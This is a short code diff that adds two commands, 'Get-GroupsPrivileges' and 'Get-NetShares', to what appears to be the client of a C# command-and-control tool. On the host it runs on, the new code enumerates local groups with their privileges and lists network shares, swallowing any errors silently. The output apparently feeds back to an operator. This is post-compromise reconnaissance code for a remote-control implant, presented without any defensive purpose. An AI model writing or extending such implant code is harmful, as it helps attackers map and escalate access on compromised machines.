@@ -1398,6 +1398,33 @@ namespace C2Client
                        cmd= winapi.Getlogonsessions();
                     }
 
+                    else if (cmd == "Get-GroupsPrivileges")
+                    {
+                        string computername = Environment.MachineName;
+                        // Console.WriteLine(computername);
+                        List<string> groups = winapi.GetGroups();
+                        
+                        foreach (var groupname in groups)
+                        {
+                            try
+                            {
+                                cmd += winapi.GetGroupsPrivileges(computername, groupname);
+                            }
+                            catch { }
+                        }
+                        
+                    }
+
+                    else if (cmd == "Get-NetShares")
+                    {
+                        try
+                        {
+                            Console.WriteLine(Environment.MachineName);
+                            cmd = winapi.GetNetShares(Environment.MachineName);
+                        }
+                        catch { }
+                    }
+
                     else
                     {
                         Program p = new Program();
